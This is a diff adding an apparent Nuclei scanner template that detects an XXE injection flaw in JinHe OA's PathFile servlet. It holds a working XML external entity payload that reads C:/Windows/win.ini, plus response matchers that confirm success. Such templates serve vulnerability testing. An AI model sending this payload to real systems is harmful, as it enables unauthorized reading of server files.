@@ -1,0 +1,39 @@
+id: JinHeOA-pathfile-xmlInjection
+
+info:
+  name: JinHeOA-pathfile-xmlInjection
+  author: iSee857
+  severity: high
+  description: |
+    JinHeOA-pathfile-xmlInjection
+
+http:
+  - raw:
+      - |
+        POST /jc6/servlet/PathFile?GetUrl HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini" >]>
+        <root>
+          <path>&xxe;</path>
+          <strType>file</strType>
+          <IsVir>no</IsVir>
+          <displayType>list</displayType>
+          <strFiles>*.*</strFiles>
+        </root>
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - fonts]
+          - 不存在
+        condition: and
+
+      - type: status
+        status:
+          - 200
